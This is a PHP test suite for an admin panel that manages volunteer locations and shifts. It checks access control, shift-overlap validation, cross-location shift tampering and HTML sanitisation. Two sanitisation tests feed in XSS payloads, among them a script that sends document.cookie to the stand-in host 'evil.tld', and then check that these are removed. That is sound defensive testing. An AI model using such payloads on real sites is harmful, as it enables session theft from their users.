<?php

use App\Models\Location;
use App\Models\Shift;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Inertia\Testing\AssertableInertia;

uses(RefreshDatabase::class);

test('admin show list locations page', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();

    $locations = Location::factory()
        ->count(6)
        ->has(Shift::factory()->everyDay9am())
        ->create();

    $sortedLocations = $locations->sortBy('name')->values();

    $this->actingAs($admin)
        ->getJson('/admin/locations')
        ->assertOk()
        ->assertInertia(fn (AssertableInertia $page) => $page
            ->component('Admin/Locations/List')
            ->has('locations', fn (AssertableInertia $data) => $data
                ->where('0.name', $sortedLocations[0]->name)
                ->has('0.shifts', $sortedLocations[0]->shifts->count())
                ->where('1.name', $sortedLocations[1]->name)
                ->has('1.shifts', $sortedLocations[1]->shifts->count())
                ->where('2.name', $sortedLocations[2]->name)
                ->has('2.shifts', $sortedLocations[2]->shifts->count())
                ->where('3.name', $sortedLocations[3]->name)
                ->has('3.shifts', $sortedLocations[3]->shifts->count())
                ->where('4.name', $sortedLocations[4]->name)
                ->has('4.shifts', $sortedLocations[4]->shifts->count())
                ->where('5.name', $sortedLocations[5]->name)
                ->has('5.shifts', $sortedLocations[5]->shifts->count())
            )
        );
});

test('user cannot see list locations page', function () {
    $user = User::factory()->enabled()->create();
    $this->actingAs($user)
        ->getJson('/admin/locations')
        ->assertForbidden();
});

test('admin can see create location page', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();
    $this->actingAs($admin)
        ->getJson('/admin/locations/create')
        ->assertOk()
        ->assertInertia(fn (AssertableInertia $page) => $page
            ->component('Admin/Locations/Add')
            ->where('maxVolunteers', config('cart-scheduler.max_volunteers_per_location'))
        );
});

test('admin can see edit location page', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();
    $location = Location::factory()
        ->has(Shift::factory()->everyDay9am())
        ->create();

    $this->actingAs($admin)
        ->getJson("/admin/locations/{$location->id}/edit")
        ->assertOk()
        ->assertInertia(fn (AssertableInertia $page) => $page
            ->component('Admin/Locations/Edit')
            ->where('maxVolunteers', config('cart-scheduler.max_volunteers_per_location'))
            ->has('location', fn (AssertableInertia $data) => $data
                ->where('id', $location->id)
                ->where('name', $location->name)
                ->where('description', $location->description)
                ->where('clean_description', fn ($data) => $data !== '')
                ->where('min_volunteers', $location->min_volunteers)
                ->where('max_volunteers', $location->max_volunteers)
                ->where('requires_brother', $location->requires_brother)
                ->where('latitude', (float) $location->latitude)
                ->where('longitude', (float) $location->longitude)
                ->where('is_enabled', $location->is_enabled)
                ->has('shifts', $location->shifts->count())
                ->etc()
            )
        );
});

test('admin can delete location', function () {
    $admin = User::factory()->enabled()->adminRoleUser()->create();

    $location = Location::factory()
        ->has(Shift::factory()->everyDay9am())
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);

    $this->actingAs($admin)
        ->deleteJson("/admin/locations/{$location->id}")
        ->assertRedirect()
        ->assertSessionHas('flash.banner', "Location $location->name successfully deleted.");

    $this->assertDatabaseCount('locations', 0);
    $this->assertDatabaseCount('shifts', 0);
});

test('admin can add location with no shifts', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $response = $this->actingAs($admin)
        ->postJson('/admin/locations', [
            'name' => 'A test city',
            'description' => 'lorem ipsum dolor sit amet',
            'min_volunteers' => 2,
            'max_volunteers' => 3,
            'requires_brother' => true,
            'is_enabled' => true,
            'shifts' => [],
        ]);
    $location = Location::first();

    $response->assertRedirect("/admin/locations/$location->id/edit");
    $this->assertDatabaseCount('locations', 1);
});

test('a description posted with script is stored sanitised', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    // The rich-text editor is a UI, not a boundary — an admin can post
    // whatever they like straight at this endpoint, and the description is
    // rendered with v-html on every volunteer's dashboard.
    $this->actingAs($admin)
        ->postJson('/admin/locations', [
            'name' => 'A test city',
            'description' => '<p>Meet here</p><script>fetch("//evil.tld?c="+document.cookie)</script>',
            'min_volunteers' => 2,
            'max_volunteers' => 3,
            'requires_brother' => true,
            'is_enabled' => true,
            'shifts' => [],
        ]);

    $description = Location::first()->description;

    $this->assertStringNotContainsString('script', $description);
    $this->assertStringNotContainsString('document.cookie', $description);

    // Sanitised, not rejected: the admin's actual prose survives.
    $this->assertStringContainsString('Meet here', $description);
});

test('an edited description is sanitised too', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);
    $location = Location::factory()->create(['description' => '<p>Original</p>']);

    $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            'name' => $location->name,
            'description' => '<p onclick="alert(1)">Updated</p><a href="javascript:alert(1)">Link</a>',
            'min_volunteers' => 1,
            'max_volunteers' => 2,
            'requires_brother' => false,
            'is_enabled' => true,
            'shifts' => [],
        ]);

    $description = $location->fresh()->description;

    $this->assertStringNotContainsString('onclick', $description);
    $this->assertStringNotContainsStringIgnoringCase('javascript:', $description);
    $this->assertStringContainsString('Updated', $description);
});

test('a description using the editors own formatting is kept intact', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    // Guards the other direction: an over-tight allowlist would quietly
    // strip formatting an admin had already saved.
    $formatted = '<h3>Parking</h3><p style="text-align: center"><strong>Rear</strong> entrance</p>'
        .'<ul><li>Bring keys</li></ul><p><a href="https://example.org">Map</a></p>';

    $this->actingAs($admin)
        ->postJson('/admin/locations', [
            'name' => 'A test city',
            'description' => $formatted,
            'min_volunteers' => 2,
            'max_volunteers' => 3,
            'requires_brother' => true,
            'is_enabled' => true,
            'shifts' => [],
        ]);

    $description = Location::first()->description;

    foreach (['<h3>', '<strong>', '<ul>', '<li>', 'text-align', 'https://example.org'] as $expected) {
        $this->assertStringContainsString($expected, $description);
    }
});

test('updating a location cannot rewrite another locations shift', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $target = Location::factory()->create();
    $other = Location::factory()->create();
    $otherShift = Shift::factory()->for($other)->create([
        'start_time' => '08:00:00',
        'end_time' => '10:00:00',
    ]);

    // The payload names a shift id belonging to a different location. The
    // lookup used to be a global Shift::find, so this rewrote that shift.
    $this->actingAs($admin)
        ->putJson("/admin/locations/$target->id", [
            'name' => $target->name,
            'description' => '<p>Unchanged</p>',
            'min_volunteers' => 1,
            'max_volunteers' => 2,
            'requires_brother' => false,
            'is_enabled' => true,
            'shifts' => [
                [
                    'id' => $otherShift->id,
                    'day_monday' => true,
                    'day_tuesday' => true,
                    'day_wednesday' => true,
                    'day_thursday' => true,
                    'day_friday' => true,
                    'day_saturday' => true,
                    'day_sunday' => true,
                    'start_time' => '13:00:00',
                    'end_time' => '17:00:00',
                    'is_enabled' => true,
                    'available_from' => null,
                    'available_to' => null,
                ],
            ],
        ]);

    $otherShift->refresh();

    expect($otherShift->start_time)->toBe('08:00:00');
    expect($otherShift->end_time)->toBe('10:00:00');
    expect($otherShift->location_id)->toBe($other->id);
});

test('admin can add location with one shift', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $response = $this->actingAs($admin)
        ->postJson('/admin/locations', [
            'name' => 'A test city',
            'description' => '<p>lorem ipsum dolor sit amet</p>',
            'min_volunteers' => 2,
            'max_volunteers' => 3,
            'requires_brother' => true,
            'is_enabled' => true,
            'shifts' => [
                // Note there are multiple shifts so we're using an array containing an array of shift(...s)
                [
                    'day_monday' => true,
                    'day_tuesday' => true,
                    'day_wednesday' => false,
                    'day_thursday' => true,
                    'day_friday' => true,
                    'day_saturday' => true,
                    'day_sunday' => true,
                    'start_time' => '10:00:00',
                    'end_time' => '13:30:00',
                    'is_enabled' => true,
                    'available_from' => null,
                    'available_to' => null,
                ],
            ],
        ]);
    $response->assertRedirect();
    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);
    $this->assertDatabaseHas('shifts', [
        'day_monday' => 1,
        'day_tuesday' => 1,
        'day_wednesday' => 0,
        'day_thursday' => 1,
        'day_friday' => 1,
        'day_saturday' => 1,
        'day_sunday' => 1,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'is_enabled' => 1,
        'location_id' => Location::first()->id,
        'available_from' => null,
        'available_to' => null,
    ]);
});

test('admin can add location with two shifts', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $shift = [
        'day_monday' => true,
        'day_tuesday' => true,
        'day_wednesday' => false,
        'day_thursday' => true,
        'day_friday' => true,
        'day_saturday' => true,
        'day_sunday' => true,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'is_enabled' => true,
        'available_from' => null,
        'available_to' => null,
    ];

    $response = $this->actingAs($admin)
        ->postJson('/admin/locations', [
            'name' => 'A test city',
            'description' => '<p>lorem ipsum dolor sit amet</p>',
            'min_volunteers' => 2,
            'max_volunteers' => 3,
            'requires_brother' => true,
            'is_enabled' => true,
            'shifts' => [
                $shift,
                [
                    ...$shift,
                    'day_wednesday' => true,
                    'day_saturday' => false,
                    'start_time' => '14:00:00',
                    'end_time' => '17:30:00',
                    'available_from' => '2021-01-01',
                    'available_to' => '2021-01-31',
                ],
            ],
        ]);
    $response->assertRedirect();
    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 2);
    $this->assertDatabaseHas('shifts', [
        'day_wednesday' => 0,
        'day_saturday' => 1,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'available_from' => null,
        'available_to' => null,
    ]);
    $this->assertDatabaseHas('shifts', [
        'day_wednesday' => 1,
        'day_saturday' => 0,
        'start_time' => '14:00:00',
        'end_time' => '17:30:00',
        'available_from' => '2021-01-01 00:00:00',
        'available_to' => '2021-01-31 23:59:59',
    ]);
});

test('admin can edit location and shift', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $location = Location::factory()
        ->state([
            'name' => 'A test city',
            'description' => '<p>lorem ipsum dolor sit amet</p>',
            'min_volunteers' => 2,
            'max_volunteers' => 3,
            'requires_brother' => true,
            'is_enabled' => false,
        ])
        ->has(Shift::factory()
            ->state([
                'day_monday' => true,
                'day_tuesday' => true,
                'day_wednesday' => false,
                'day_thursday' => true,
                'day_friday' => true,
                'day_saturday' => true,
                'day_sunday' => true,
                'start_time' => '10:00:00',
                'end_time' => '13:30:00',
                'is_enabled' => false,
                'available_from' => null,
                'available_to' => null,
            ])
        )
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseHas('locations', [
        'name' => 'A test city',
        'max_volunteers' => 3,
        'requires_brother' => 1,
        'is_enabled' => 0,
    ]);

    $this->assertDatabaseCount('shifts', 1);
    $this->assertDatabaseHas('shifts', [
        'day_wednesday' => 0,
        'day_sunday' => 1,
    ]);

    $response = $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            'name' => 'A test city!', // changed
            'description' => '<p>lorem ipsum dolor sit amet</p>',
            'min_volunteers' => 2,
            'max_volunteers' => 4, // changed
            'requires_brother' => false, // changed
            'is_enabled' => true, // changed
            'shifts' => [
                [
                    'id' => $location->shifts[0]->id,
                    'day_monday' => true,
                    'day_tuesday' => true,
                    'day_wednesday' => true, // changed
                    'day_thursday' => true,
                    'day_friday' => true,
                    'day_saturday' => true,
                    'day_sunday' => false, // changed
                    'start_time' => '10:00:00',
                    'end_time' => '13:30:00',
                    'is_enabled' => true,
                    'available_from' => null,
                    'available_to' => null,
                ],
            ],
        ]);

    $response->assertRedirect("/admin/locations/$location->id/edit");
    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseHas('locations', [
        'name' => 'A test city!',
        'max_volunteers' => 4,
        'requires_brother' => 0,
        'is_enabled' => 1,
    ]);

    $this->assertDatabaseCount('shifts', 1);
    $this->assertDatabaseHas('shifts', [
        'day_wednesday' => 1,
        'day_sunday' => 0,
    ]);
});

test('admin can add location with restricted timeframe availability shift', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $response = $this->actingAs($admin)
        ->postJson('/admin/locations', [
            'name' => 'A test city',
            'description' => '<p>lorem ipsum dolor sit amet</p>',
            'min_volunteers' => 2,
            'max_volunteers' => 3,
            'requires_brother' => true,
            'is_enabled' => true,
            'shifts' => [
                [
                    'day_monday' => true,
                    'day_tuesday' => true,
                    'day_wednesday' => false,
                    'day_thursday' => true,
                    'day_friday' => true,
                    'day_saturday' => true,
                    'day_sunday' => true,
                    'start_time' => '10:00:00',
                    'end_time' => '13:30:00',
                    'is_enabled' => true,
                    'available_from' => '2021-01-01',
                    'available_to' => '2021-01-31',
                ],
            ],
        ]);

    $response->assertRedirect();
    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);
    $this->assertDatabaseHas('shifts', [
        'day_wednesday' => 0,
        'day_saturday' => 1,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'available_from' => '2021-01-01 00:00:00',
        'available_to' => '2021-01-31 23:59:59',
    ]);
});

test('admin can add extra shift', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $locationState = [
        'name' => 'A test city',
        'description' => '<p>lorem ipsum dolor sit amet</p>',
        'min_volunteers' => 2,
        'max_volunteers' => 3,
        'requires_brother' => true,
        'is_enabled' => true,
    ];

    $shiftState = [
        'day_monday' => true,
        'day_tuesday' => true,
        'day_wednesday' => true,
        'day_thursday' => true,
        'day_friday' => true,
        'day_saturday' => true,
        'day_sunday' => true,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'is_enabled' => true,
        'available_from' => null,
        'available_to' => null,
    ];

    $location = Location::factory()
        ->state($locationState)
        ->has(Shift::factory()->state($shiftState))
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);

    $response = $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            ...$locationState,
            'shifts' => [
                [
                    'id' => $location->shifts[0]->id,
                    ...$shiftState,
                ],
                [
                    ...$shiftState,
                    'start_time' => '13:30:00',
                    'end_time' => '16:00:00',
                    'available_from' => '2021-01-01',
                    'available_to' => '2021-01-31',
                ],
            ],
        ]);

    $response->assertRedirect("/admin/locations/$location->id/edit");
    $this->assertDatabaseCount('locations', 1);

    $this->assertDatabaseCount('shifts', 2);
});

test('admin can delete a shift', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $location = Location::factory()
        ->has(Shift::factory()->count(2))
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 2);

    $shiftIds = $location->shifts->pluck('id');

    $response = $this->actingAs($admin)
        ->deleteJson("/admin/shifts/$shiftIds[0]");

    $response->assertNoContent();
    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);
    $this->assertDatabaseMissing('shifts', ['id' => $shiftIds[0]]);
    $this->assertDatabaseHas('shifts', ['id' => $shiftIds[1]]);
});

test('admin cannot add overlapping enabled shift with no availability dates', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $locationState = [
        'name' => 'A test city!',
        'description' => '<p>lorem ipsum dolor sit amet</p>',
        'min_volunteers' => 2,
        'max_volunteers' => 4,
        'requires_brother' => false,
        'is_enabled' => true,
    ];

    $shiftState = [
        'day_monday' => true,
        'day_tuesday' => true,
        'day_wednesday' => true,
        'day_thursday' => true,
        'day_friday' => true,
        'day_saturday' => true,
        'day_sunday' => false,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'is_enabled' => true,
        'available_from' => null,
        'available_to' => null,
    ];

    $location = Location::factory()
        ->state($locationState)
        ->has(Shift::factory()->state($shiftState))
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);

    $response = $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            ...$locationState,
            'shifts' => [
                [
                    'id' => $location->shifts[0]->id,
                    ...$shiftState,
                ],
                [
                    ...$shiftState,
                    // end time is after the start time of the first shift. Should generate an error.
                    'start_time' => '09:00:00',
                    'end_time' => '11:30:00',
                ],
                [
                    ...$shiftState,
                    // start time is before the end time of the first shift. Should generate an error.
                    'start_time' => '12:00:00',
                    'end_time' => '15:30:00',
                ],
            ],
        ]);

    $response->assertInvalid(['shifts.0.start_time', 'shifts.1.start_time']);
    $errors = $response->json('errors');

    $this->assertStringContainsStringIgnoringCase('[Code: 130]', $errors['shifts.0.start_time'][0]);
    $this->assertStringContainsStringIgnoringCase('[Code: 130]', $errors['shifts.1.start_time'][0]);
    $this->assertStringContainsStringIgnoringCase('[Code: 130]', $errors['shifts.2.start_time'][0]);

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);
});

test('admin cannot add overlapping enabled shift where one has availability from and to dates', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $locationState = [
        'name' => 'A test city!',
        'description' => '<p>lorem ipsum dolor sit amet</p>',
        'min_volunteers' => 2,
        'max_volunteers' => 4,
        'requires_brother' => false,
        'is_enabled' => true,
    ];

    $shiftState = [
        'day_monday' => true,
        'day_tuesday' => true,
        'day_wednesday' => true,
        'day_thursday' => true,
        'day_friday' => true,
        'day_saturday' => true,
        'day_sunday' => false,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'is_enabled' => true,
        'available_from' => null,
        'available_to' => null,
    ];

    $location = Location::factory()
        ->state($locationState)
        ->has(Shift::factory()->state($shiftState))
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);

    $response = $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            ...$locationState,
            'shifts' => [
                [
                    'id' => $location->shifts[0]->id,
                    ...$shiftState,
                ],
                [
                    ...$shiftState,
                    // start time is before the end time of the first shift. Should generate an error.
                    'start_time' => '12:00:00',
                    'end_time' => '15:30:00',
                    'available_from' => '2021-01-01',
                    'available_to' => '2021-01-31',
                ],
            ],
        ]);

    $response->assertInvalid(['shifts.0.start_time', 'shifts.1.start_time']);
    $errors = $response->json('errors');

    $this->assertStringContainsStringIgnoringCase('[Code: 121]', $errors['shifts.0.start_time'][0]);
    $this->assertStringContainsStringIgnoringCase('[Code: 120]', $errors['shifts.1.start_time'][0]);

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);
});

test('admin cannot add overlapping enabled shift where both shifts have availability from and to dates', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $locationState = [
        'name' => 'A test city!',
        'description' => '<p>lorem ipsum dolor sit amet</p>',
        'min_volunteers' => 2,
        'max_volunteers' => 4,
        'requires_brother' => false,
        'is_enabled' => true,
    ];

    $shiftState = [
        'day_monday' => true,
        'day_tuesday' => true,
        'day_wednesday' => true,
        'day_thursday' => true,
        'day_friday' => true,
        'day_saturday' => true,
        'day_sunday' => false,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'is_enabled' => true,
        'available_from' => '2021-01-01',
        'available_to' => '2021-01-31',
    ];

    $location = Location::factory()
        ->state($locationState)
        ->has(Shift::factory()->state($shiftState))
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);

    $response = $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            ...$locationState,
            'shifts' => [
                [
                    'id' => $location->shifts[0]->id,
                    ...$shiftState,
                ],
                [
                    ...$shiftState,
                    // start time is before the end time of the first shift. Should generate an error.
                    'start_time' => '12:00:00',
                    'end_time' => '15:30:00',
                    'available_from' => '2021-01-01',
                    'available_to' => '2021-01-31',
                ],
            ],
        ]);

    $response->assertInvalid(['shifts.0.start_time', 'shifts.1.start_time']);
    $errors = $response->json('errors');

    $this->assertStringContainsStringIgnoringCase('[Code: 110]', $errors['shifts.0.start_time'][0]);
    $this->assertStringContainsStringIgnoringCase('[Code: 110]', $errors['shifts.1.start_time'][0]);

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);
});

test('admin can add overlapping disabled shift', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $locationState = [
        'name' => 'A test city!',
        'description' => '<p>lorem ipsum dolor sit amet</p>',
        'min_volunteers' => 2,
        'max_volunteers' => 4,
        'requires_brother' => false,
        'is_enabled' => true,
    ];

    $shiftState = [
        'day_monday' => true,
        'day_tuesday' => true,
        'day_wednesday' => true,
        'day_thursday' => true,
        'day_friday' => true,
        'day_saturday' => true,
        'day_sunday' => false,
        'start_time' => '10:00:00',
        'end_time' => '13:30:00',
        'is_enabled' => false,
        'available_from' => null,
        'available_to' => null,
    ];

    $location = Location::factory()
        ->state($locationState)
        ->has(Shift::factory()->state($shiftState))
        ->create();

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 1);

    $response = $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            ...$locationState,
            'shifts' => [
                [
                    'id' => $location->shifts[0]->id,
                    ...$shiftState,
                ],
                [
                    ...$shiftState,
                    // start time is before the end time of the first shift. Should generate an error.
                    'start_time' => '12:00:00',
                    'end_time' => '15:30:00',
                    'is_enabled' => true,
                ],
            ],
        ]);
    $response->assertRedirect("/admin/locations/{$location->id}/edit");

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 2);
});

test('start time cannot be after end time', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    $locationState = [
        'name' => 'A test city!',
        'description' => '<p>lorem ipsum dolor sit amet</p>',
        'min_volunteers' => 2,
        'max_volunteers' => 4,
        'requires_brother' => false,
        'is_enabled' => true,
    ];

    $location = Location::factory()
        ->state($locationState)
        ->create();

    $this->assertDatabaseCount('locations', 1);

    $response = $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", [
            ...$locationState,
            'shifts' => [
                [
                    'day_monday' => true,
                    'day_tuesday' => true,
                    'day_wednesday' => true,
                    'day_thursday' => true,
                    'day_friday' => true,
                    'day_saturday' => true,
                    'day_sunday' => false,
                    'start_time' => '13:00:00', // end time is after start time. Should generate an error.
                    'end_time' => '11:30:00',
                    'is_enabled' => false,
                    'available_from' => null,
                    'available_to' => null,
                ],
            ],
        ]);

    $response->assertInvalid(['shifts.0.start_time', 'shifts.0.end_time']);

    $this->assertDatabaseCount('locations', 1);
    $this->assertDatabaseCount('shifts', 0);
});

test('re enabling disabled shift does not conflict with existing shifts', function () {
    $admin = User::factory()->adminRoleUser()->create(['is_enabled' => true]);

    /** @var Location $location */
    $location = Location::factory()
        ->has(
            Shift::factory()
                ->everyDay9am()
                ->count(2)
                ->sequence(['is_enabled' => false], ['is_enabled' => true])
        )
        ->create();

    $location->load('shifts');

    $location->shifts->setHidden(['location_id', 'updated_at', 'created_at']);
    $lArray = $location->setHidden(['id', 'updated_at', 'created_at'])->toArray();
    $lArray['shifts'][0]['is_enabled'] = true;

    $this->actingAs($admin)
        ->putJson("/admin/locations/$location->id", $lArray)
        ->assertUnprocessable()
        ->assertInvalid(['shifts.0.start_time', 'shifts.1.start_time']);
});
